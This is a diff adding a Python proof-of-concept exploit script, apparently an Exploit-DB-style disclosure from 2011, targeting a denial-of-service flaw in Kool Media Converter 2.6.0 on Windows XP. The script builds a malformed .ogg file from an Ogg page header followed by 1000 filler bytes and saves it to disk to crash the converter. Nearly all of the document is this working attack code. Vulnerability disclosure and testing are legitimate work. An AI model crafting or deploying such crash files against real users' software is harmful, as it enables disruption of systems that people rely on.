@@ -1,0 +1,40 @@
+#!/usr/bin/env python
+#
+#
+# Exploit Title: Kool Media Converter v2.6.0 DOS
+# Date: 10/10/2011
+# Author: swami
+# E-Mail: flavio[dot]baldassi[at]gmail[dot]com
+# Software Link: http://www.bestwebsharing.com/downloads/kool-media-converter-setup.exe
+# Version: 2.6.0
+# Tested on: Windows XP SP3 ENG
+#
+#--- From Vendor Website
+# Kool Media Converter is a sound tool addressed to casual listeners and fervent 
+# audiophiles likewise. It deals with compatibility problems between your audio files 
+# and the media player you are using to help you enjoy all the songs you love anyway you like.
+#
+#--- Description
+# Kool Media Converter fails to handle a malformed .ogg file
+
+ogg = b'\x4F\x67\x67\x53'		# Capture Pattern OggS in ascii
+ogg += b'\x00'				# Version currently 0
+ogg += b'\x02'		     		# Header Type of page that follows
+ogg += b'\x00' * 8			# Granule Position
+ogg += b'\xCE\xc6\x41\x49'		# Bitstream Serial Number
+ogg += b'\x00' * 4 			# Page Sequence Number
+ogg += b'\x70\x79\xf3\x3d'	     	# Checksum
+ogg += b'\x01'		     		# Page Segment max 255
+ogg += b'\x1e\x01\x76\x6f'		# Segment Table
+
+ogg += b'\x41' * 1000
+
+try:
+	f = open('koolPoC.ogg','wb')
+	f.write(ogg)
+	f.close()
+except:
+	print('\nError while creating ogg file\n')
+
+
+
